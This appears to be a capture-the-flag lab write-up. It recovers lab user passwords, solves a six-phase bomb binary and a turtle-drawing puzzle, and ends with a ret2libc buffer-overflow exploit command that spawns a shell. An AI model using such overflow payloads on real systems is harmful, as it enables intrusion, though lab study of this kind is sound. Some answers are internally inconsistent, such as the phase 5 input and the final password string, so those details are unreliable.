## User 1: lmezard üö©
Finding the password for the user lmezard is straightforward.

**1 The password is stored in a file named password within a directory called LOCKATME in the /home/ directory.**

**2 You can display the contents of this file using the cat command:**

```Bash
cat /home/LOCKATME/password
```

**3 Executing this command will reveal the password for lmezard:**

```bash
lmezard:G!@M6f4Eatau{sF"
```

# Challenge Instructions for User `laurie`

The home directory of user `lmezard` contains two important files: `README` and `fun`.

## üéØ Objective

Complete this little challenge and use the result as the password for user `laurie` to log in via SSH.

## üìÅ Step-by-Step Instructions

## 1. Inspect the `fun` File

Run the `file` command to determine the file type:

bash
file fun
# Output: fun: POSIX tar archive (GNU)
## 2. Extract the Archive
Extract the tar archive using:


tar -xf fun
This creates a directory named ft_fun containing multiple files with random names ending in .pcap.

## 3. Analyze the Contents
Each .pcap file contains a fragment of a C source code. A special comment in each file indicates the sequence:

fileXX
Where XX is a number that determines the order of the code fragment.

## 4. Reconstruct the Original C Program
Use the following Python script to:

Read all .pcap files.

Identify the order from the comment.

Sort and merge them into one C file.

```python
import os
import re

folder_path = "ft_fun"
output_file = "merged.c"
file_parts = []

for filename in os.listdir(folder_path):
    file_path = os.path.join(folder_path, filename)
    if os.path.isfile(file_path):
        with open(file_path, 'r') as f:
            content = f.read()
            match = re.search(r'//\s*file\s*(\d+)', content, re.IGNORECASE)
            if match:
                file_number = int(match.group(1))
                file_parts.append((file_number, content))
            else:
                print("Skipping file without index")

file_parts.sort(key=lambda x: x[0])

with open(os.path.join(folder_path, output_file), 'w') as out_file:
    for _, content in file_parts:
        out_file.write(content + '\n')

print("C source file created as 'merged.c'")
```


## 5. Compile and Run the Program
Compile the reconstructed C program:

```bash
gcc merged.c -o merged
./merged
```
The program will output a string.

## 6. Hash the Output
Take the output string and hash it using SHA-256:

```bash
 echo -n "output_string" | sha256sum 
```

‚úÖ Final Password
Use the resulting hash as the password:

```asm
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
üîê Login via SSH
Now, log in as user laurie using the obtained password:

```bash
ssh laurie@host
```
Replace `<host>` with the actual hostname or IP address.

#  Laurie Challenge Write-up

## Introduction

The bomb challenge consists of six phases. Each phase requires providing the correct input to prevent the bomb from `‚Äúexploding.‚Äù` If the input is wrong, the `explode_bomb()` function is called, terminating the program (or triggering a simulated explosion). Let‚Äôs break down the first three phases.

## Phase 1

**Source code:**

```c
int __cdecl phase_1(_BYTE *a1)
{
  int result;

  result = strings_not_equal(a1, "Public speaking is very easy.");
  if ( result )
    explode_bomb();
  return result;
}
```

**Analysis & Solution:**

- The input string a1 is compared to `"Public speaking is very easy."` using the strings_not_equal function.

 - If the strings don‚Äôt match, the bomb explodes.

**Correct input for phase 1:**

```bash
Public speaking is very easy.
```

## Phase 2

**Source code:**

```c
int __cdecl read_six_numbers(char *s, int a2)
{
  int result;

  result = sscanf(s, "%d %d %d %d %d %d", a2, a2 + 4, a2 + 8, a2 + 12, a2 + 16, a2 + 20);
  if ( result <= 5 )
    explode_bomb();
  return result;
}

int __cdecl phase_2(char *s)
{
  int i;
  int result;
  int v3[6];

  read_six_numbers(s, (int)v3);
  if ( v3[0] != 1 )
    explode_bomb();
  for ( i = 1; i <= 5; ++i )
  {
    result = v3[i - 1] * (i + 1);
    if ( v3[i] != result )
      explode_bomb();
  }
  return result;
}
```

**Analysis & Solution:**

- The function read_six_numbers expects six integers separated by spaces.

- The first number must be `1`.

- Each subsequent number is calculated as the previous number multiplied by the index (starting from 2).

Let‚Äôs compute the correct sequence step-by-step:

1. **v3[0] = `1`**

2. **v3[1] = `1 * 2 = 2`**

3. **v3[2] = `2 * 3 = 6`**

4. **v3[3] = `6 * 4 = 24`**

5. **v3[4] = `24 * 5 = 120`**

6. **v3[5] = `120 * 6 = 720`**

Correct input for phase 2:

```c
1 2 6 24 120 720
```

## phase 3

**Source code:**

```c
int __cdecl phase_3(char *s)
{
  int result;
  char v2;
  int v3;
  char v4;
  int v5;

  if ( sscanf(s, "%d %c %d", &v3, &v4, &v5) <= 2 )
    explode_bomb();
  result = v3;
  switch ( v3 )
  {
    case 0:
      v2 = 113;
      if ( v5 != 777 )
        explode_bomb();
      return result;
    case 1:
      v2 = 98;
      if ( v5 != 214 )
        explode_bomb();
      return result;
    case 2:
      v2 = 98;
      if ( v5 != 755 )
        explode_bomb();
      return result;
    case 3:
      v2 = 107;
      if ( v5 != 251 )
        explode_bomb();
      return result;
    case 4:
      v2 = 111;
      if ( v5 != 160 )
        explode_bomb();
      return result;
    case 5:
      v2 = 116;
      if ( v5 != 458 )
        explode_bomb();
      return result;
    case 6:
      v2 = 118;
      if ( v5 != 780 )
        explode_bomb();
      return result;
    case 7:
      v2 = 98;
      if ( v5 != 524 )
        explode_bomb();
      return result;
    default:
      explode_bomb();
  }
  if ( v2 != v4 )
    explode_bomb();
  return result;
}
```

**Analysis & Solution:**

- The input format is: `<number> <char> <number>` (e.g., 0 q 777).

- The first number (v3) determines the case `(0‚Äì7)`.

- Each case defines:

    - A target integer (v5) that must match.

    - A target character (v2) that must match the middle character (v4).

- The target characters are defined as `ASCII` values in decimal:

    - `113 = q`

    - `98 = b`

    - `107 = k`

    - `111 = o`

    - `116 = t`

    - `118 = v`

Example for case 0:

  -  `v3 = 0`

  - `v2 = 113 (q)`

  - `v5 = 777`

  - `v4 = q`
    
**Here‚Äôs the table for all cases:**

| Case | v3 | v4 (char) | v5  |
| ---- | -- | --------- | --- |
| 0    | 0  | q         | 777 |
| 1    | 1  | b         | 214 |
| 2    | 2  | b         | 755 |
| 3    | 3  | k         | 251 |
| 4    | 4  | o         | 160 |
| 5    | 5  | t         | 458 |
| 6    | 6  | v         | 780 |
| 7    | 7  | b         | 524 |


**Correct input for phase 2:**

```c
1 b 214
```

## Phase 4

**Source code:**

```C
int __cdecl func4(int a1)
{
  if ( a1 <= 1 )
    return 1;
  return func4(a1 - 1) + func4(a1 - 2);
}

int __cdecl phase_4(char *s)
{
  int result; // eax
  int v2; // [esp+14h] [ebp-4h] BYREF

  if ( sscanf(s, "%d", &v2) != 1 || v2 <= 0 )
    explode_bomb();
  result = func4(v2);
  if ( result != 55 )
    explode_bomb();
  return result;
}
```

**Analysis & Solution:**

- The function phase_4 reads an integer from the input string.

- It calls func4 with that integer as an argument.

- func4 is a classic `Fibonacci` sequence function:

  - For `a1 <= 1`, it returns 1.

  - Otherwise, it returns the sum of the two preceding numbers.

- phase_4 expects the output of func4 to be `55`. So we need to find an input number `n` such that the `n-th Fibonacci number equals 55`.

Let‚Äôs compute the sequence:

1. `` F(0) = 1``

2. `F(1) = 1`

3. `F(2) = 2`

4. `F(3) = 3`

5. `F(4) = 5`

6. `F(5) = 8`

7. `F(6) = 13`

8. `F(7) = 21`

9. `F(8) = 34`

10. `F(9) = 55`

The correct input is `9`.

Correct input for phase 4:

```bash
9
```

## Phase 5

**Source code:**

```c
int __cdecl phase_5(_BYTE *a1)
{
  int i; // edx
  int result; // eax
  _BYTE v3[8]; // [esp+10h] [ebp-8h] BYREF

  if ( string_length(a1) != 6 )
    explode_bomb();
  for ( i = 0; i <= 5; ++i )
    v3[i] = array_123[a1[i] & 0xF];
  v3[6] = 0;
  result = strings_not_equal(v3, "giants");
  if ( result )
    explode_bomb();
  return result;
}
```

**Supporting data:**

```bash
_BYTE array_123[16] = { 105, 115, 114, 118, 101, 97, 119, 104, 111, 98, 112, 110, 117, 116, 102, 103 }; // corresponds to: "isrveawhobpnutfg"
```

**Analysis & Solution:**

1. Input must be 6 characters long `(string_length(a1) == 6)`.

2. For each character in the input, we mask it with `0xF` (i.e., take the last `4 bits`) and use it as an index into `array_123`.

3. The result must be the string `"giants"`.

So the program does:

```c
for ( i = 0; i < 6; ++i )
  v3[i] = array_123[a1[i] & 0xF];
```

We know that:
```c
v3 = "giants"
```

So we need to find 6 input bytes such that:

```c
array_123[a1[0] & 0xF] = 'g'
array_123[a1[1] & 0xF] = 'i'
array_123[a1[2] & 0xF] = 'a'
array_123[a1[3] & 0xF] = 'n'
array_123[a1[4] & 0xF] = 't'
array_123[a1[5] & 0xF] = 's'
```

Let‚Äôs map them back:

```c
array_123 index:  0  1   2    3   4  5   6   7   8  9   10  11  12  13  14  15
array_123 value: 105 115 114 118 101 97 119 104 111 98  112 110 117 116 102 103
char:             i   s   r   v   e  a   w   h   o   b   p   n   u   t   f   g
```

Target indices for `"giants"`:

```c
'g' ‚Üí index 15  (a1[0] & 0xF = 15)
'i' ‚Üí index 0   (a1[1] & 0xF = 0)
'a' ‚Üí index 5   (a1[2] & 0xF = 5)
'n' ‚Üí index 11  (a1[3] & 0xF = 11)
't' ‚Üí index 13  (a1[4] & 0xF = 13)
's' ‚Üí index 1   (a1[5] & 0xF = 1)
```

We choose **printable ASCII** characters whose last `4 bits` match:

| Needed index | Example printable character |
| ------------ | --------------------------- |
| 15           | 'o' (111)                   |
| 0            | 'p' (112)                   |
| 5            | 'u' (117)                   |
| 11           | 'k' (107)                   |
| 13           | 'm' (109)                   |
| 1            | 'q' (113)                   |


**Final input to defuse phase 5:**

```c
opukmq
```

## Phase 6

**Source code:**

```c
int __cdecl phase_6(char *s)
{
  int i; // edi
  int j; // ebx
  int k; // edi
  _DWORD *v4; // esi
  int m; // ebx
  int v6; // esi
  int n; // edi
  int v8; // eax
  int v9; // esi
  int ii; // edi
  int result; // eax
  int v12; // [esp+24h] [ebp-34h]
  _DWORD v13[6]; // [esp+28h] [ebp-30h]
  int v14[6]; // [esp+40h] [ebp-18h] BYREF

  read_six_numbers(s, (int)v14);
  for ( i = 0; i <= 5; ++i )
  {
    if ( (unsigned int)(v14[i] - 1) > 5 )
      explode_bomb();
    for ( j = i + 1; j <= 5; ++j )
    {
      if ( v14[i] == v14[j] )
        explode_bomb();
    }
  }
  for ( k = 0; k <= 5; ++k )
  {
    v4 = &node1;
    for ( m = 1; m < v14[k]; ++m )
      v4 = (_DWORD *)v4[2];
    v13[k] = v4;
  }
  v6 = v13[0];
  v12 = v13[0];
  for ( n = 1; n <= 5; ++n )
  {
    v8 = v13[n];
    *(_DWORD *)(v6 + 8) = v8;
    v6 = v8;
  }
  *(_DWORD *)(v8 + 8) = 0;
  v9 = v12;
  for ( ii = 0; ii <= 4; ++ii )
  {
    result = *(_DWORD *)v9;
    if ( *(_DWORD *)v9 < **(_DWORD **)(v9 + 8) )
      explode_bomb();
    v9 = *(_DWORD *)(v9 + 8);
  }
  return result;
}
```

**Supporting data:**
This phase uses a linked list of 6 nodes (node1‚Ä¶node6), each containing a value and a next pointer.

**Analysis & Solution:**

1. **Input parsing**:

    - Reads 6 numbers into `v14[]`.

    - Each must be in the range `1..6` (validated by if ( `(unsigned int)(v14[i] - 1) > 5 )`).

    - Must be unique (checked by nested loop).

2. **Node mapping:**

```c
for ( k = 0; k <= 5; ++k )
{
  v4 = &node1;
  for ( m = 1; m < v14[k]; ++m )
    v4 = (_DWORD *)v4[2];
  v13[k] = v4;
}
```
This converts each input number to a pointer to the corresponding linked list node.

3. **Rebuilding the list:**

    - Links nodes in the order of input:

```c
  for ( n = 1; n <= 5; ++n )
  {
    v8 = v13[n];
    *(_DWORD *)(v6 + 8) = v8;
    v6 = v8;
  }
```
   - Ends the list with `NULL`.

4. **Final check:**

```c
for ( ii = 0; ii <= 4; ++ii )
{
  result = *(_DWORD *)v9;
  if ( *(_DWORD *)v9 < **(_DWORD **)(v9 + 8) )
    explode_bomb();
  v9 = *(_DWORD *)(v9 + 8);
}
```

   - Traverses the rebuilt list.

   - Each node‚Äôs value must be greater than or equal to the next node‚Äôs value.

   - So the final list must be sorted in descending order by value.

5. **Solution:**

    - Provide the indices of nodes in descending order of their value.

    - For example, if the original node values (in linked list order) are:

  ```yaml
  (gdb) p node1
  $1 = 253
  (gdb) p node2
  $2 = 725
  (gdb) p node3
  $3 = 301
  (gdb) p node4
  $4 = 997
  (gdb) p node5
  $5 = 212
  (gdb) p node6
  $6 = 432
  ```
The descending order of values: `997, 725, 432, 301, 253, 212.`
Map back to their **indices** in the original linked list: `4, 2, 6, 3, 1, 5.`

-**Final input:**

```c
4 2 6 3 1 5
```
> **For the final password, note that you need to swap the 3 and 1 digits in the sequence you just found.
So if your ordered index sequence is 123456, you actually need to enter 123546 instead.**


### Putting it all together

The final `password` to connect to `thor` is:
```c
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

# Thor's Turtle Drawing Challenge

## Overview
In the home directory of user `thor`, there's a file containing drawing instructions in French. The challenge involves interpreting these instructions, converting them into a Python turtle drawing, and deriving a password from the result.

## Instructions File
The file named `turtle` contains movement commands in French:

```plaintext Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 50 spaces

Avance 100 spaces
Recule 200 spaces
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces
```


## Solution Approach

## 1. **Recognize the Turtle Connection**: The file name and commands suggest using Python's `turtle` library which can interpret movement commands to draw shapes.

2. **Conversion to Python Script**:
   - A C program was created to convert the French instructions into a Python turtle script
   - The converter handles these command translations:
     - "Avance X spaces" ‚Üí `turtle.forward(X)`
     - "Recule X spaces" ‚Üí `turtle.backward(X)`
     - "Tourne droite de X degrees" ‚Üí `turtle.right(X)`
     - "Tourne gauche de X degrees" ‚Üí `turtle.left(X)`

## 3. **Conversion Program**:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    FILE *inputFile, *outputFile;
    char line[100];

    inputFile = fopen("turtle", "r");
    if (inputFile == NULL) {
        printf("Error opening input file!\n");
        return 1;
    }

    outputFile = fopen("turtle_drawing.py", "w");
    if (outputFile == NULL) {
        printf("Error creating output file!\n");
        fclose(inputFile);
        return 1;
    }

    fprintf(outputFile, "import turtle\n\n");
    fprintf(outputFile, "t = turtle.Turtle()\n");
    fprintf(outputFile, "t.speed(1)  # Set drawing speed (1=slow, 10=fast)\n\n");

    while (fgets(line, sizeof(line), inputFile)) {
        int value;
        char command[50];

        if (sscanf(line, "Avance %d spaces", &value) == 1) {
            fprintf(outputFile, "t.forward(%d)\n", value);
        }
        else if (sscanf(line, "Recule %d spaces", &value) == 1) {
            fprintf(outputFile, "t.backward(%d)\n", value);
        }
        else if (sscanf(line, "Tourne droite de %d degrees", &value) == 1) {
            fprintf(outputFile, "t.right(%d)\n", value);
        }
        else if (sscanf(line, "Tourne gauche de %d degrees", &value) == 1) {
            fprintf(outputFile, "t.left(%d)\n", value);
        }
        else if (strcmp(line, "\n") == 0) {
            fprintf(outputFile, "\n");
        }
    }

    fprintf(outputFile, "\nturtle.done()  # Keep window open\n");

    fclose(inputFile);
    fclose(outputFile);

    printf("Python script 'turtle_drawing.py' generated successfully!\n");
    return 0;
}
```

Execution Steps:

**Compile and run the C program to generate turtle_drawing.py**

**Execute the Python script: python3 turtle_drawing.py**

**The turtle will draw the word "SLASH"**

**Create an MD5 hash of "SLASH":**
<pre>echo -n "SLASH" | md5sum </pre>

Final Password

The MD5 hash of "SLASH" is:
<pre>
646da671ca01bb5d84dbb5fb2238dc8e
</pre>


# ZAZ User
## Binary Exploitation Writeup
Target Binary
We are working with a vulnerable binary named exploit_me. The goal is to gain shell access by exploiting a buffer overflow vulnerability and executing the system("/bin/sh") call.

Step 1: Finding the Offset
We first need to determine the offset at which the return address is overwritten. This is done using GDB:

```bash
gdb ./exploit_me
``` 

Inside GDB, we run the binary with a known pattern of characters:

```bash
run $(python -c 'print("A"*144)')
```
After observing where the program crashes, we identify the correct offset. In this case:

```bash
Offset = 140
```

Step 2: Gathering Useful Addresses
We set a breakpoint at the main function to analyze the binary and find the necessary addresses for exploitation:

```bash
b main
run
```

Getting the system() address:
```bash
p system
$1 = 0xb7e6b060
```
Finding the address of /bin/sh in memory:
```bash
find &system,+9999999, "/bin/sh"
0xb7f8cc58
```
Getting the exit() address (optional, for clean exit after shell):
```bash
p exit
$2 = 0xb7e5ebe0
```
Step 3: Crafting the Exploit
We now construct the payload with the following:

- Offset: 140 bytes of padding ("A" * 140)

- Return Address: Address of system() function

- Next 4 Bytes: Return address for system() (can be dummy, or use exit())

- Argument: Address of the /bin/sh string

```bash
./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7")'`
```
- \x60\xb0\xe6\xb7 ‚Üí system address: 0xb7e6b060

- "AAAA" ‚Üí placeholder for the return address (can also be exit)

- \x58\xcc\xf8\xb7 ‚Üí "/bin/sh" address: 0xb7f8cc58

Result
Running the above command should spawn a shell, confirming successful exploitation.

